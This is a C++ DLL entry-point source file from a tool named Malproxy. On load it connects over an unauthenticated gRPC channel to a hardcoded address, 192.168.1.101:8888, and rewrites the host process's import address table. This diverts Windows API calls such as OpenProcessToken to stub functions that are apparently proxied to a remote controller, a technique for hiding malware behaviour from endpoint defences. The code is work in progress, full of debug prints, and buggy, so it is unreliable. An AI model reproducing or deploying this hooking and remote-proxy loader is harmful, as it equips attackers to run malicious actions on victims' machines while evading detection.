// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <memory>
#include <RpcLib\MalproxySession.h>
#include <Framework\Utils.h>
#include <MalproxyClient\MalproxyClientRunner.h>
#include "Dbghelp.h"
 
extern std::map<std::string, std::map<std::string, FARPROC>> autogenerated_stubs;

void InitGRPC() {
    std::shared_ptr<MalproxySession> client = std::make_shared<MalproxySession>();
    std::string url = StringUtils::FormatString("192.168.1.101:8888");
    client->Connect(url, grpc::InsecureChannelCredentials());
    MalproxyClientRunner::Init(client);
}

void InstallHook() {
	ULONG ulSize = 0;
	PROC pHookFunction = NULL;
	PROC pHookedFunction = NULL;

	PSTR pszModName = NULL;
	printf(" DLL IS UPLOADING\n");

	HMODULE hModule = GetModuleHandle(0);
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = NULL;

	for (const auto& lib : autogenerated_stubs) {
		std::string lbName = lib.first;
		printf("A lbname is %s\n",lbName.c_str());
		for (const auto& fn : lib.second) {
			printf("B\n");
			//char* cstr = new char[fn.first.length() + 10];
			std::string fnStubName = fn.first + "_stub";
			LPCSTR lpstr = const_cast<char*>(fnStubName.c_str());
			//char* pfnStubName= new char [128];
			//strcpy_s(pfnStubName, fnStubName.size(), fnStubName.data());
			//pfnStubName[fnStubName.size()] = '\0';
			//strcpy_s(cstr, fn.first.length(), fn.first.c_str());
			//strcat_s(cstr, 10, "_stub");
			//const char pfnStubName[] = cast<const char*>fnStubName.c_str();
			//const char* cstr = fnStubName.data();
			/*std::unique_ptr<char[]> cstr = std::make_unique<char[]>(fnStubName.size() + 1);
			std::copy(fnStubName.data(), fnStubName.data()+fnStubName.size(), cstr);
			cstr[fnStubName.size()] = '\0'; // A null-terminator needs to be added
			 */

			printf("lib is %s fnStub is %s, fn is %s\n",lbName.c_str(), lpstr,fn.first.c_str());
			pHookFunction = GetProcAddress(GetModuleHandle(L"MalproxyClientDLL.dll"),(LPCSTR)lpstr);
			pHookedFunction = GetProcAddress(GetModuleHandle((LPCTSTR)lbName.c_str()),"OpenProcessToken");
			PROC pHookFunction2 = GetProcAddress(GetModuleHandle(L"MalproxyClientDLL.dll"), "OpenProcessToken_stub");
			printf("phookFunction2 is %p\n", pHookFunction2);
			printf("phookFunction is %p, pHookedFunction is %p\n", &pHookedFunction, &pHookedFunction);

			pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(
				hModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &ulSize);

			if (NULL != pImportDesc)
			{
				for (; pImportDesc->Name; pImportDesc++)
				{
					// get the module name
					pszModName = (PSTR)((PBYTE)hModule + pImportDesc->Name);

					if (NULL != pszModName)
					{

						printf("pszModName is %s, lbname.c_str() is %s\n", pszModName, lbName.c_str());
						// check if the module is kernel32.dll
						if (lstrcmpiA(pszModName, lbName.c_str()) == 0)
						{
							printf("AAAAAAAAAAAAAAAA\n");

							// get the module
							PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc->FirstThunk);

							for (; pThunk->u1.Function; pThunk++)
							{
								PROC* ppfn = (PROC*)&pThunk->u1.Function;
								printf("ppfn is %p,pHookedFunction is %p\n", ppfn, pHookedFunction);

								if (*ppfn == pHookedFunction)
								{
									printf("EEEEEEEEEEEEEEEEEEEE\n");
									WriteProcessMemory(GetCurrentProcess(), ppfn, &pHookedFunction, sizeof(pHookFunction), NULL);
									DWORD dwTest = GetLastError();

									printf("error is %d\n", dwTest);

									//if (WriteProcessMemory(GetCurrentProcess(), ppfn, &pHookedFunction, sizeof(pHookFunction), NULL))
									//{
									DWORD dwOldProtect = 0;
									if (VirtualProtect(ppfn, sizeof(pHookFunction), PAGE_WRITECOPY, &dwOldProtect))
									{
										// perform the write ....
										dwTest = GetLastError();

										printf("2nd error is %d\n", dwTest);
										WriteProcessMemory(GetCurrentProcess(), ppfn, &pHookFunction, sizeof(pHookFunction), NULL);
										VirtualProtect(ppfn, sizeof(pHookFunction), dwOldProtect, &dwOldProtect);
									}
									//}// Can write to the process 
								} // Function that we are looking for
							}
						} // Compare module name
					} // Valid module name
				}
			}
		}
	}
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
		InitGRPC();
        InstallHook();
    }
    return TRUE;
    }
}

